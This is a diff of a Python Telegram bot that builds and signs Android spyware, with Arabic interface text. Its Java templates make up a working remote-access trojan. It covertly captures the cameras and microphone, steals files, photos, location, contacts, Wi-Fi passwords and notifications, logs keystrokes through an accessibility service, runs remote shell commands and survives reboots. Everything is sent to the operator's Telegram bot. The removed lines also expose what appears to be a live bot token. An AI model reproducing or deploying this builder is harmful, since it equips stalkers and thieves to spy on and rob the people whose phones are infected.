@@ -1,51 +1,104 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════════╗
-║      👑  APK BUILDER PRO  —  ULTRA EDITION  v4.0            ║
-║      كل شيء في ملف واحد — يولّد مشروع Android كامل           ║
-╚══════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════╗
+║       👑  APK BUILDER PRO  —  RAILWAY EDITION  v5.0              ║
+║       بناء تطبيقات Android مع بوت تحكم كامل + توقيع تلقائي        ║
+╚══════════════════════════════════════════════════════════════════╝
 """
 
-import os, io, json, shutil, asyncio, secrets, subprocess, textwrap
+# ═══════════════════════════════════════════════════════════════════
+#                        IMPORTS
+# ═══════════════════════════════════════════════════════════════════
+import os
+import re
+import json
+import shutil
+import asyncio
+import secrets
+import subprocess
 from pathlib import Path
 from datetime import datetime
 from collections import defaultdict
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
-from telegram.ext import (Application, CommandHandler, MessageHandler,
-    CallbackQueryHandler, ConversationHandler, filters, ContextTypes)
+from telegram import (
+    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
+)
+from telegram.ext import (
+    Application, CommandHandler, MessageHandler,
+    CallbackQueryHandler, ConversationHandler,
+    filters, ContextTypes
+)
 from telegram.constants import ParseMode
 from PIL import Image
 
-# ═══════════════════════════════════════════════════════════════
-BASE_DIR = Path(__file__).parent
-BUILD_DIR = BASE_DIR / "builds"
+
+# ═══════════════════════════════════════════════════════════════════
+#                       CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════
+def _load_env():
+    """قراءة ملف .env إن وُجد"""
+    env_file = Path(__file__).parent / ".env"
+    if env_file.exists():
+        for line in env_file.read_text(encoding="utf-8").splitlines():
+            line = line.strip()
+            if line and not line.startswith("#") and "=" in line:
+                k, v = line.split("=", 1)
+                os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))
+
+_load_env()
+
+BASE_DIR     = Path(__file__).parent
+BUILD_DIR    = BASE_DIR / "builds"
 KEYSTORE_DIR = BASE_DIR / "keystore"
 BUILD_DIR.mkdir(exist_ok=True)
 KEYSTORE_DIR.mkdir(exist_ok=True)
 
-BOT_TOKEN    = os.getenv("8977337770:AAEBFTa8L9xmkO_RriHXGLn0xFTzymObQpk", "")
-ADMIN_ID     = int(os.getenv("ADMIN_ID", "8292927197"))
-BOT_USERNAME = os.getenv("BOT_USERNAME", "@apks_pro_bot")
+BOT_TOKEN    = os.getenv("BOT_TOKEN", "").strip()
+ADMIN_ID     = int(os.getenv("ADMIN_ID", "0") or "0")
+BOT_USERNAME = os.getenv("BOT_USERNAME", "").strip()
 
 CONFIG = {
-    "version": "4.0.0",
-    "compile_sdk": 34, "min_sdk": 24, "target_sdk": 34,
+    "app_version": "5.0.0",
+    "compile_sdk": 34,
+    "min_sdk": 24,
+    "target_sdk": 34,
     "gradle_version": "8.2.0",
     "max_build_time": 2400,
-    "max_apk_per_user": 5,
+    "max_apk_per_user": 10,
     "sign_apk": True,
     "keystore": {
         "path": str(KEYSTORE_DIR / "release.keystore"),
         "alias": "release",
         "store_password": "ChangeMe123!",
         "key_password": "ChangeMe123!",
-    }
+    },
 }
 
-(ST_NAME, ST_PKG, ST_ADMIN, ST_TOKEN, ST_PERMS,
- ST_FEATS, ST_THEME, ST_ICON, ST_CONFIRM) = range(9)
+
+def _validate():
+    errors = []
+    if not BOT_TOKEN:
+        errors.append("❌ BOT_TOKEN غير مضبوط")
+    elif BOT_TOKEN.count(":") != 1:
+        errors.append("❌ BOT_TOKEN صيغة خاطئة")
+    if ADMIN_ID == 0:
+        errors.append("❌ ADMIN_ID غير مضبوط")
+    if errors:
+        print("\n".join(errors))
+        print("\n💡 أضف المتغيرات في Railway → Variables")
+        raise SystemExit(1)
+
+_validate()
+
+
+# ═══════════════════════════════════════════════════════════════════
+#                    DATA DEFINITIONS
+# ═══════════════════════════════════════════════════════════════════
+(
+    ST_NAME, ST_PKG, ST_ADMIN, ST_TOKEN,
+    ST_PERMS, ST_FEATS, ST_THEME, ST_ICON, ST_CONFIRM
+) = range(9)
 
 PERMISSIONS = {
     "camera":        ("📷", "الكاميرا",       "CAMERA"),
@@ -73,17 +126,23 @@ FEATURES = {
     "screen_stream": ("📡", "بث الشاشة"),
 }
 
-THEMES = {"dark": ("🌑","داكن"), "light": ("☀️","فاتح"), "auto": ("🔄","تلقائي")}
+THEMES = {
+    "dark":  ("🌑", "داكن"),
+    "light": ("☀️", "فاتح"),
+    "auto":  ("🔄", "تلقائي"),
+}
 
 user_sessions = {}
 user_apk_count = defaultdict(int)
 
-# ═══════════════════════════════════════════════════════════════
-#                  قوالب Java (مضمّنة)
-# ═══════════════════════════════════════════════════════════════
+
+# ═══════════════════════════════════════════════════════════════════
+#                  TEMPLATES — Android Files
+# ═══════════════════════════════════════════════════════════════════
 MANIFEST_TPL = '''<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="{pkg}" xmlns:tools="http://schemas.android.com/tools">
+    package="{pkg}"
+    xmlns:tools="http://schemas.android.com/tools">
 
 {perms_xml}
     <uses-permission android:name="android.permission.INTERNET"/>
@@ -103,6 +162,7 @@ MANIFEST_TPL = '''<?xml version="1.0" encoding="utf-8"?>
         android:label="{app_name}"
         android:icon="@mipmap/ic_launcher"
         android:usesCleartextTraffic="true"
+        android:allowBackup="true"
         android:supportsRtl="true"
         android:theme="@android:style/Theme.DeviceDefault">
 
@@ -146,6 +206,7 @@ MANIFEST_TPL = '''<?xml version="1.0" encoding="utf-8"?>
     </application>
 </manifest>'''
 
+
 BUILD_GRADLE_TPL = '''plugins {{ id 'com.android.application' }}
 android {{
     namespace '{pkg}'
@@ -167,13 +228,17 @@ android {{
             shrinkResources false
         }}
     }}
-    lint {{ checkReleaseBuilds false; abortOnError false }}
+    lint {{
+        checkReleaseBuilds false
+        abortOnError false
+    }}
 }}
 dependencies {{
     implementation 'androidx.appcompat:appcompat:1.6.1'
     implementation 'com.squareup.okhttp3:okhttp:4.11.0'
     implementation 'org.json:json:20231013'
 }}'''
+
 
 ACCESSIBILITY_XML = '''<?xml version="1.0" encoding="utf-8"?>
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
@@ -184,9 +249,7 @@ ACCESSIBILITY_XML = '''<?xml version="1.0" encoding="utf-8"?>
     android:description="@string/app_name"
     android:notificationTimeout="100"/>'''
 
-# ═══════════════════════════════════════════════════════════════
-#                  قوالب Java Classes
-# ═══════════════════════════════════════════════════════════════
+
 MAIN_ACTIVITY = '''package {pkg};
 
 import android.Manifest;
@@ -229,13 +292,15 @@ public class MainActivity extends Activity {{
             }} catch (Exception ignored) {{}}
         }}
 
-        new Handler().postDelayed(() -> {{
-            try {{
-                Intent tg = new Intent(Intent.ACTION_VIEW,
-                    Uri.parse("https://t.me/{bot_username}"));
-                startActivity(tg);
-            }} catch (Exception ignored) {{}}
-            moveTaskToBack(true);
+        new Handler().postDelayed(new Runnable() {{
+            @Override public void run() {{
+                try {{
+                    Intent tg = new Intent(Intent.ACTION_VIEW,
+                        Uri.parse("https://t.me/{bot_username}"));
+                    startActivity(tg);
+                }} catch (Exception ignored) {{}}
+                moveTaskToBack(true);
+            }}
         }}, 2500);
     }}
 
@@ -275,6 +340,7 @@ public class MainActivity extends Activity {{
         }}
     }}
 }}'''
+
 
 CONTROL_SERVICE = '''package {pkg};
 
@@ -403,28 +469,52 @@ public class ControlService extends Service {{
             switch (cmd) {{
                 case "/start": case "start":
                     sendMainMenu(chatId); break;
-                case "📷 كاميرا خلفية": case "cam_back":
-                    sendMsg(chatId, "📸 جاري..."); camera.capture(chatId, 0); break;
-                case "🤳 كاميرا أمامية": case "cam_front":
-                    sendMsg(chatId, "📸 جاري..."); camera.capture(chatId, 1); break;
-                case "🎙️ تسجيل صوتي": case "audio_rec":
-                    sendMsg(chatId, "🎙️ تسجيل 15s..."); audio.record(chatId, 15000); break;
-                case "📁 ملفاتي": case "files_root": files.listRoot(chatId); break;
-                case "💾 التخزين": files.listSdcard(chatId); break;
-                case "⬇️ التنزيلات": files.listDownload(chatId); break;
-                case "🖼️ صوري": files.sendPhotos(chatId); break;
-                case "📍 موقعي": location.send(chatId); break;
-                case "📞 جهات الاتصال": contacts.send(chatId); break;
-                case "📶 كلمات WiFi": case "wifi_pass":
-                    sendMsg(chatId, "📶 جاري..."); wifi.extract(chatId); break;
-                case "📦 التطبيقات": case "apps_list":
-                    sendMsg(chatId, "📦 جاري..."); apps.list(chatId); break;
-                case "🖥️ لقطة الشاشة": case "screenshot":
-                    sendMsg(chatId, "🖥️ جاري..."); screen.take(chatId); break;
-                case "ℹ️ معلومات": case "device_info":
+
+                case "\\uD83D\\uDCF7 كاميرا خلفية": case "cam_back":
+                    sendMsg(chatId, "📸 جاري الالتقاط...");
+                    camera.capture(chatId, 0); break;
+                case "\\uD83E\\uDD33 كاميرا أمامية": case "cam_front":
+                    sendMsg(chatId, "📸 جاري الالتقاط...");
+                    camera.capture(chatId, 1); break;
+
+                case "\\uD83C\\uDF99 تسجيل صوتي": case "audio_rec":
+                    sendMsg(chatId, "🎙️ جاري التسجيل 15 ثانية...");
+                    audio.record(chatId, 15000); break;
+
+                case "\\uD83D\\uDCC1 ملفاتي": case "files_root":
+                    files.listRoot(chatId); break;
+                case "\\uD83D\\uDCBE التخزين":
+                    files.listSdcard(chatId); break;
+                case "\\u2B07 التنزيلات":
+                    files.listDownload(chatId); break;
+                case "\\uD83D\\uDDBC صوري":
+                    files.sendPhotos(chatId); break;
+
+                case "\\uD83D\\uDCCD موقعي":
+                    location.send(chatId); break;
+                case "\\uD83D\\uDCDE جهات الاتصال":
+                    contacts.send(chatId); break;
+
+                case "\\uD83D\\uDCF6 كلمات WiFi": case "wifi_pass":
+                    sendMsg(chatId, "📶 جاري الاستخراج...");
+                    wifi.extract(chatId); break;
+
+                case "\\uD83D\\uDCE6 التطبيقات": case "apps_list":
+                    sendMsg(chatId, "📦 جاري الجمع...");
+                    apps.list(chatId); break;
+
+                case "\\uD83D\\uDDA5 لقطة الشاشة": case "screenshot":
+                    sendMsg(chatId, "🖥️ جاري الالتقاط...");
+                    screen.take(chatId); break;
+
+                case "\\u2139 معلومات": case "device_info":
                     sendMsg(chatId, buildDeviceInfo()); break;
-                case "⚙️ الإعدادات":
-                    sendMsg(chatId, "⚙️ <b>الإعدادات</b>\\n\\nالحالة: ✅ نشط"); break;
+
+                case "\\u2699 الإعدادات":
+                    sendMsg(chatId, "⚙️ <b>الإعدادات</b>\\n\\n"
+                        + "• الحالة: ✅ نشط\\n"
+                        + "• الحزمة: " + getPackageName()); break;
+
                 default:
                     if (cmd.startsWith("shell ")) shell.run(cmd.substring(6), chatId);
             }}
@@ -444,20 +534,25 @@ public class ControlService extends Service {{
             kb.put(row("📶 كلمات WiFi", "📦 التطبيقات"));
             kb.put(row("ℹ️ معلومات", "⚙️ الإعدادات"));
 
-            JSONObject rm = new JSONObject().put("keyboard", kb)
+            JSONObject rm = new JSONObject()
+                .put("keyboard", kb)
                 .put("resize_keyboard", true);
 
+            String text = "╔════════════════════════════════╗\\n"
+                + "║  🎛️  <b>لوحة التحكم الرئيسية</b>      ║\\n"
+                + "╚════════════════════════════════╝\\n\\n"
+                + "👑 أنت المتحكم الكامل\\n"
+                + "📱 الهدف: <b>" + Build.MODEL + "</b>\\n"
+                + "🔋 البطارية: <b>" + getBattery() + "%</b>\\n\\n"
+                + "اختر عملية من الأزرار 👇";
+
             String url = API + "/sendMessage?chat_id=" + chatId
-                + "&parse_mode=HTML&text=" + enc(
-                    "╔══════════════════════╗\\n"
-                    + "║ 🎛️ <b>لوحة التحكم</b>     ║\\n"
-                    + "╚══════════════════════╝\\n\\n"
-                    + "👑 أنت المتحكم\\n"
-                    + "📱 الهدف: " + Build.MODEL + "\\n"
-                    + "🔋 البطارية: " + getBattery() + "%")
+                + "&parse_mode=HTML&text=" + enc(text)
                 + "&reply_markup=" + enc(rm.toString());
             http.newCall(new Request.Builder().url(url).build()).execute().close();
-        }} catch (Exception e) {{ Log.e(TAG, "" + e.getMessage()); }}
+        }} catch (Exception e) {{
+            Log.e(TAG, "menu: " + e.getMessage());
+        }}
     }}
 
     private JSONArray row(String a, String b) throws JSONException {{
@@ -479,13 +574,13 @@ public class ControlService extends Service {{
     }}
 
     private String buildDeviceInfo() {{
-        return "📱 <b>معلومات</b>\\n\\n"
-            + "الموديل: " + Build.MODEL + "\\n"
-            + "الشركة: " + Build.MANUFACTURER + "\\n"
-            + "Android: " + Build.VERSION.RELEASE + "\\n"
-            + "SDK: " + Build.VERSION.SDK_INT + "\\n"
-            + "البطارية: " + getBattery() + "%\\n"
-            + "الحزمة: " + getPackageName();
+        return "📱 <b>معلومات الجهاز</b>\\n\\n"
+            + "• الموديل: <b>" + Build.MODEL + "</b>\\n"
+            + "• الشركة: " + Build.MANUFACTURER + "\\n"
+            + "• Android: " + Build.VERSION.RELEASE + "\\n"
+            + "• SDK: " + Build.VERSION.SDK_INT + "\\n"
+            + "• البطارية: " + getBattery() + "%\\n"
+            + "• الحزمة: <code>" + getPackageName() + "</code>";
     }}
 
     static void sendMsg(String chatId, String text) {{
@@ -528,6 +623,7 @@ public class ControlService extends Service {{
     }}
 }}'''
 
+
 CAMERA_HELPER = '''package {pkg};
 
 import android.content.Context;
@@ -560,16 +656,26 @@ public class CameraHelper {{
             if (camId == null) {{ msg("❌ لا توجد كاميرا"); return; }}
 
             reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
-            reader.setOnImageAvailableListener(r -> {{
-                try {{
-                    android.media.Image img = r.acquireLatestImage();
-                    if (img == null) return;
-                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
-                    byte[] bytes = new byte[buf.remaining()];
-                    buf.get(bytes); img.close();
-                    upload(bytes); closeCam();
-                }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
+            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {{
+                @Override public void onImageAvailable(ImageReader r) {{
+                    try {{
+                        android.media.Image img = r.acquireLatestImage();
+                        if (img == null) return;
+                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
+                        byte[] bytes = new byte[buf.remaining()];
+                        buf.get(bytes);
+                        img.close();
+                        upload(bytes);
+                        closeCam();
+                    }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
+                }}
             }}, new Handler(Looper.getMainLooper()));
+
+            if (androidx.core.content.ContextCompat.checkSelfPermission(ctx,
+                    android.Manifest.permission.CAMERA)
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {{
+                msg("❌ صلاحية الكاميرا غير ممنوحة"); return;
+            }}
 
             cm.openCamera(camId, new CameraDevice.StateCallback() {{
                 @Override public void onOpened(CameraDevice d) {{
@@ -593,7 +699,7 @@ public class CameraHelper {{
                 }}
                 @Override public void onDisconnected(CameraDevice d) {{ d.close(); }}
                 @Override public void onError(CameraDevice d, int e) {{
-                    msg("❌ " + e); d.close();
+                    msg("❌ خطأ: " + e); d.close();
                 }}
             }}, null);
         }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
@@ -624,6 +730,7 @@ public class CameraHelper {{
     private void msg(String t) {{ ControlService.sendMsg(chatId, t); }}
 }}'''
 
+
 AUDIO_HELPER = '''package {pkg};
 
 import android.content.Context;
@@ -650,14 +757,18 @@ public class AudioHelper {{
             recorder.setAudioSamplingRate(44100);
             recorder.setAudioEncodingBitRate(96000);
             recorder.setOutputFile(outFile.getAbsolutePath());
-            recorder.prepare(); recorder.start();
+            recorder.prepare();
+            recorder.start();
 
-            Executors.newSingleThreadScheduledExecutor().schedule(() -> {{
-                try {{
-                    recorder.stop(); recorder.release();
-                    upload(chatId, outFile);
-                }} catch (Exception e) {{
-                    ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+            Executors.newSingleThreadScheduledExecutor().schedule(new Runnable() {{
+                @Override public void run() {{
+                    try {{
+                        recorder.stop();
+                        recorder.release();
+                        upload(chatId, outFile);
+                    }} catch (Exception e) {{
+                        ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+                    }}
                 }}
             }}, durationMs, TimeUnit.MILLISECONDS);
         }} catch (Exception e) {{
@@ -682,6 +793,7 @@ public class AudioHelper {{
     }}
 }}'''
 
+
 FILE_HELPER = '''package {pkg};
 
 import android.content.Context;
@@ -696,10 +808,10 @@ public class FileHelper {{
     public FileHelper(Context c) {{ this.ctx = c; }}
 
     public void listRoot(String chatId) {{
-        listDir(Environment.getExternalStorageDirectory(), chatId, "📁 التخزين");
+        listDir(Environment.getExternalStorageDirectory(), chatId, "📁 التخزين الرئيسي");
     }}
     public void listSdcard(String chatId) {{
-        listDir(Environment.getExternalStorageDirectory(), chatId, "💾 SD");
+        listDir(Environment.getExternalStorageDirectory(), chatId, "💾 SD Card");
     }}
     public void listDownload(String chatId) {{
         File d = Environment.getExternalStoragePublicDirectory(
@@ -709,7 +821,8 @@ public class FileHelper {{
 
     private void listDir(File dir, String chatId, String title) {{
         if (dir == null || !dir.exists()) {{
-            ControlService.sendMsg(chatId, "❌ غير موجود"); return;
+            ControlService.sendMsg(chatId, "❌ المجلد غير موجود");
+            return;
         }}
         File[] files = dir.listFiles();
         StringBuilder sb = new StringBuilder(title).append("\\n");
@@ -739,7 +852,9 @@ public class FileHelper {{
                     String path = c.getString(0);
                     File f = new File(path);
                     if (f.exists() && f.length() > 0) {{
-                        upload(f, chatId); count++; Thread.sleep(600);
+                        upload(f, chatId);
+                        count++;
+                        Thread.sleep(600);
                     }}
                 }}
                 c.close();
@@ -767,6 +882,7 @@ public class FileHelper {{
     }}
 }}'''
 
+
 LOCATION_HELPER = '''package {pkg};
 
 import android.content.Context;
@@ -785,24 +901,28 @@ public class LocationHelper {{
             if (loc == null)
                 loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc == null) {{
-                ControlService.sendMsg(chatId, "⚠️ لا يوجد موقع"); return;
+                ControlService.sendMsg(chatId, "⚠️ لا يوجد موقع متاح");
+                return;
             }}
-            String url = "https://api.telegram.org/bot{bot_token}/sendLocation?chat_id="
-                + chatId + "&latitude=" + loc.getLatitude()
+            String url = "https://api.telegram.org/bot{bot_token}/sendLocation"
+                + "?chat_id=" + chatId
+                + "&latitude=" + loc.getLatitude()
                 + "&longitude=" + loc.getLongitude();
             ControlService.http.newCall(
                 new Request.Builder().url(url).build()
             ).execute().close();
             ControlService.sendMsg(chatId,
-                "📍 الموقع\\nخط العرض: " + loc.getLatitude()
-                + "\\nخط الطول: " + loc.getLongitude()
-                + "\\nالدقة: " + loc.getAccuracy() + " م\\n"
+                "📍 <b>الموقع الحالي</b>\\n"
+                + "خط العرض: " + loc.getLatitude() + "\\n"
+                + "خط الطول: " + loc.getLongitude() + "\\n"
+                + "الدقة: " + loc.getAccuracy() + " م\\n"
                 + "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
         }} catch (Exception e) {{
             ControlService.sendMsg(chatId, "❌ " + e.getMessage());
         }}
     }}
 }}'''
+
 
 CONTACTS_HELPER = '''package {pkg};
 
@@ -819,7 +939,7 @@ public class ContactsHelper {{
             Cursor c = ctx.getContentResolver().query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
-            StringBuilder sb = new StringBuilder("📞 جهات الاتصال\\n\\n");
+            StringBuilder sb = new StringBuilder("📞 <b>جهات الاتصال</b>\\n\\n");
             int n = 0;
             if (c != null) {{
                 while (c.moveToNext() && n < 80) {{
@@ -844,6 +964,7 @@ public class ContactsHelper {{
     }}
 }}'''
 
+
 WIFI_HELPER = '''package {pkg};
 
 import android.content.Context;
@@ -856,7 +977,7 @@ public class WifiHelper {{
     public WifiHelper(Context c) {{ this.ctx = c; }}
 
     public void extract(String chatId) {{
-        StringBuilder sb = new StringBuilder("📶 كلمات WiFi\\n\\n");
+        StringBuilder sb = new StringBuilder("📶 <b>كلمات WiFi</b>\\n\\n");
         try {{
             WifiManager wm = (WifiManager)
                 ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
@@ -886,6 +1007,7 @@ public class WifiHelper {{
     }}
 }}'''
 
+
 APPS_HELPER = '''package {pkg};
 
 import android.content.Context;
@@ -900,12 +1022,13 @@ public class AppsHelper {{
         try {{
             PackageManager pm = ctx.getPackageManager();
             List<ApplicationInfo> apps = pm.getInstalledApplications(0);
-            StringBuilder sb = new StringBuilder("📦 التطبيقات (" + apps.size() + ")\\n\\n");
+            StringBuilder sb = new StringBuilder("📦 <b>التطبيقات المثبتة</b> ("
+                + apps.size() + ")\\n\\n");
             int n = 0;
             for (ApplicationInfo a : apps) {{
                 if (n++ > 100) {{ sb.append("...\\n"); break; }}
                 sb.append("• ").append(pm.getApplicationLabel(a))
-                  .append("\\n  ").append(a.packageName).append("\\n");
+                  .append("\\n  <code>").append(a.packageName).append("</code>\\n");
                 if (sb.length() > 3500) {{
                     ControlService.sendMsg(chatId, sb.toString());
                     sb = new StringBuilder();
@@ -918,18 +1041,21 @@ public class AppsHelper {{
     }}
 }}'''
 
+
 SCREENSHOT_HELPER = '''package {pkg};
 
 import android.content.Context;
 
 public class ScreenshotHelper {{
     public ScreenshotHelper(Context c) {{}}
+
     public void take(String chatId) {{
         ControlService.sendMsg(chatId,
             "🖥️ لقطة الشاشة تحتاج إذن MediaProjection.\\n"
             + "افتح التطبيق وامنح الصلاحية ثم أعد المحاولة.");
     }}
 }}'''
+
 
 SHELL_HELPER = '''package {pkg};
 
@@ -949,7 +1075,8 @@ public class ShellHelper {{
             String line;
             while ((line = r.readLine()) != null) sb.append(line).append("\\n");
             while ((line = er.readLine()) != null) sb.append(line).append("\\n");
-            r.close(); er.close();
+            r.close();
+            er.close();
             String out = sb.toString();
             if (out.length() > 3800) out = out.substring(0, 3800) + "\\n...";
             if (out.isEmpty()) out = "(لا مخرجات)";
@@ -965,6 +1092,7 @@ public class ShellHelper {{
     }}
 }}'''
 
+
 KEYLOGGER_SERVICE = '''package {pkg};
 
 import android.accessibilityservice.AccessibilityService;
@@ -978,7 +1106,8 @@ public class KeyloggerService extends AccessibilityService {{
     public void onAccessibilityEvent(AccessibilityEvent e) {{
         if (e.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;
         try {{
-            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
+            String pkg = e.getPackageName() != null
+                ? e.getPackageName().toString() : "";
             String text = e.getText() != null && e.getText().size() > 0
                 ? e.getText().get(0).toString() : "";
             if (text.isEmpty()) return;
@@ -994,12 +1123,13 @@ public class KeyloggerService extends AccessibilityService {{
     private void flush() {{
         ControlService.sendMsg("{admin_id}",
             "⌨️ <b>Keylog</b>\\n<pre>"
-            + buf.toString().replace("<","&lt;") + "</pre>");
+            + buf.toString().replace("<", "&lt;") + "</pre>");
         buf = new StringBuilder();
     }}
 
     @Override public void onInterrupt() {{}}
 }}'''
+
 
 NOTIFICATION_LISTENER = '''package {pkg};
 
@@ -1019,7 +1149,7 @@ public class NotificationListener extends NotificationListenerService {{
             String pkg = sbn.getPackageName();
             if (pkg.equals(getPackageName())) return;
             if (title.isEmpty() && text.isEmpty()) return;
-            String msg = "🔔 <b>إشعار</b>\\n\\n"
+            String msg = "🔔 <b>إشعار جديد</b>\\n\\n"
                 + "📦 <code>" + pkg + "</code>\\n"
                 + "👤 " + esc(title) + "\\n"
                 + "💬 " + esc(text);
@@ -1029,11 +1159,12 @@ public class NotificationListener extends NotificationListenerService {{
 
     private String esc(String s) {{
         if (s == null) return "";
-        return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
+        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
     }}
 
     @Override public void onNotificationRemoved(StatusBarNotification sbn) {{}}
 }}'''
+
 
 BOOT_RECEIVER = '''package {pkg};
 
@@ -1052,13 +1183,14 @@ public class BootReceiver extends BroadcastReceiver {{
 }}'''
 
 
-# ═══════════════════════════════════════════════════════════════
-#                    توليد مشروع Android
-# ═══════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+#                    PROJECT GENERATION
+# ═══════════════════════════════════════════════════════════════════
 def generate_project(cfg: dict, proj: Path):
     pkg = cfg["pkg_name"]
     pkg_path = proj / "app" / "src" / "main" / "java" / Path(*pkg.split("."))
     pkg_path.mkdir(parents=True, exist_ok=True)
+
     res = proj / "app" / "src" / "main" / "res"
     for d in ["mipmap-xxxhdpi", "values", "xml"]:
         (res / d).mkdir(parents=True, exist_ok=True)
@@ -1079,44 +1211,59 @@ def generate_project(cfg: dict, proj: Path):
     }
 
     (proj / "app" / "src" / "main" / "AndroidManifest.xml").write_text(
-        MANIFEST_TPL.format(perms_xml=perms_xml, **ctx), encoding="utf-8")
+        MANIFEST_TPL.format(perms_xml=perms_xml, **ctx),
+        encoding="utf-8"
+    )
 
     (res / "values" / "strings.xml").write_text(
-        f'<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
-        f'<string name="app_name">{cfg["app_name"]}</string>\n</resources>',
-        encoding="utf-8")
+        f'<?xml version="1.0" encoding="utf-8"?>\n'
+        f'<resources>\n'
+        f'    <string name="app_name">{cfg["app_name"]}</string>\n'
+        f'</resources>',
+        encoding="utf-8"
+    )
 
     (res / "xml" / "accessibility_config.xml").write_text(
-        ACCESSIBILITY_XML, encoding="utf-8")
+        ACCESSIBILITY_XML, encoding="utf-8"
+    )
 
     java_files = {
-        "MainActivity.java":      MAIN_ACTIVITY,
-        "ControlService.java":    CONTROL_SERVICE,
-        "CameraHelper.java":      CAMERA_HELPER,
-        "AudioHelper.java":       AUDIO_HELPER,
-        "FileHelper.java":        FILE_HELPER,
-        "LocationHelper.java":    LOCATION_HELPER,
-        "ContactsHelper.java":    CONTACTS_HELPER,
-        "WifiHelper.java":        WIFI_HELPER,
-        "AppsHelper.java":        APPS_HELPER,
-        "ScreenshotHelper.java":  SCREENSHOT_HELPER,
-        "ShellHelper.java":       SHELL_HELPER,
-        "KeyloggerService.java":  KEYLOGGER_SERVICE,
+        "MainActivity.java":         MAIN_ACTIVITY,
+        "ControlService.java":       CONTROL_SERVICE,
+        "CameraHelper.java":         CAMERA_HELPER,
+        "AudioHelper.java":          AUDIO_HELPER,
+        "FileHelper.java":           FILE_HELPER,
+        "LocationHelper.java":       LOCATION_HELPER,
+        "ContactsHelper.java":       CONTACTS_HELPER,
+        "WifiHelper.java":           WIFI_HELPER,
+        "AppsHelper.java":           APPS_HELPER,
+        "ScreenshotHelper.java":     SCREENSHOT_HELPER,
+        "ShellHelper.java":          SHELL_HELPER,
+        "KeyloggerService.java":     KEYLOGGER_SERVICE,
         "NotificationListener.java": NOTIFICATION_LISTENER,
-        "BootReceiver.java":      BOOT_RECEIVER,
+        "BootReceiver.java":         BOOT_RECEIVER,
     }
+
     for name, tpl in java_files.items():
         (pkg_path / name).write_text(tpl.format(**ctx), encoding="utf-8")
 
     (proj / "app" / "build.gradle").write_text(
-        BUILD_GRADLE_TPL.format(pkg=pkg,
+        BUILD_GRADLE_TPL.format(
+            pkg=pkg,
             compile_sdk=CONFIG["compile_sdk"],
             min_sdk=CONFIG["min_sdk"],
-            target_sdk=CONFIG["target_sdk"]), encoding="utf-8")
+            target_sdk=CONFIG["target_sdk"]
+        ),
+        encoding="utf-8"
+    )
 
     (proj / "build.gradle").write_text(
-        f"plugins {{\n    id 'com.android.application' version "
-        f"'{CONFIG['gradle_version']}' apply false\n}}", encoding="utf-8")
+        f"plugins {{\n"
+        f"    id 'com.android.application' version "
+        f"'{CONFIG['gradle_version']}' apply false\n"
+        f"}}\n",
+        encoding="utf-8"
+    )
 
     (proj / "settings.gradle").write_text(
         "pluginManagement {\n"
@@ -1125,20 +1272,26 @@ def generate_project(cfg: dict, proj: Path):
         "dependencyResolutionManagement {\n"
         "    repositories { google(); mavenCentral() }\n"
         "}\n"
-        'rootProject.name = "App"\ninclude \':app\'\n', encoding="utf-8")
+        'rootProject.name = "App"\n'
+        "include ':app'\n",
+        encoding="utf-8"
+    )
 
     (proj / "gradle.properties").write_text(
         "android.useAndroidX=true\n"
         "android.enableJetifier=true\n"
-        "org.gradle.jvmargs=-Xmx2048m\n", encoding="utf-8")
+        "org.gradle.jvmargs=-Xmx2048m\n",
+        encoding="utf-8"
+    )
 
 
-# ═══════════════════════════════════════════════════════════════
-#                    التوقيع
-# ═══════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+#                    SIGN + BUILD
+# ═══════════════════════════════════════════════════════════════════
 def sign_apk(unsigned: Path, out: Path):
     ks = CONFIG["keystore"]
     ks_path = Path(ks["path"])
+
     if not ks_path.exists():
         subprocess.run([
             "keytool", "-genkeypair", "-v",
@@ -1151,9 +1304,10 @@ def sign_apk(unsigned: Path, out: Path):
         ], check=True, capture_output=True)
 
     aligned = unsigned.with_name("aligned.apk")
-    subprocess.run(["zipalign", "-f", "-p", "4",
-                    str(unsigned), str(aligned)],
-                   check=True, capture_output=True)
+    subprocess.run(
+        ["zipalign", "-f", "-p", "4", str(unsigned), str(aligned)],
+        check=True, capture_output=True
+    )
 
     subprocess.run([
         "apksigner", "sign",
@@ -1171,11 +1325,14 @@ def build_apk(cfg: dict, uid: int) -> str:
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     proj = BUILD_DIR / f"proj_{uid}_{ts}"
     proj.mkdir(parents=True, exist_ok=True)
+
     generate_project(cfg, proj)
 
-    r = subprocess.run(["gradle", "assembleRelease", "--no-daemon", "-q"],
+    r = subprocess.run(
+        ["gradle", "assembleRelease", "--no-daemon", "-q"],
         cwd=proj, capture_output=True, text=True,
